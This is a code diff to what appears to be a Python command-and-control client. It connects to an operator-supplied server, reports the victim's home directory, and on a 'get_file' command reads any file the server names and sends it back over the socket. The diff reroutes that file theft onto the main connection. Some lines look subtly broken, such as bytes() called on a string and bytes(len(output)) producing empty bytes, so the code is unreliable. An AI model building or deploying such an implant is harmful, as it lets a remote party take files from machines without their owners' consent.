@@ -10,7 +10,7 @@ def main():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     buff = 4096
     s.connect((args.server, args.port))
-    output = ''
+    output = 'NSTR'
     while True:
         try:
             received = s.recv(buff).strip().split()
@@ -23,16 +23,12 @@ def main():
                 s.send(b'Client initial checkin\n')
                 s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
             elif 'get_file' in command:
-                fs=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                fs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                fs.connect((args.server, 12))
                 with open(command[1]) as f:
-                    fs.sendall(bytes(f.read()))
+                    tmp = f.read()
+                s.sendall(bytes(tmp))
             elif 'sendbuf' in command:
-                print(command, output)
                 s.send(bytes(len(output)))
             elif 'ack' in command:
-                print(command, output)
                 s.sendall(bytes(output))
         except OSError as err:
             print("{0}\n".format(err))
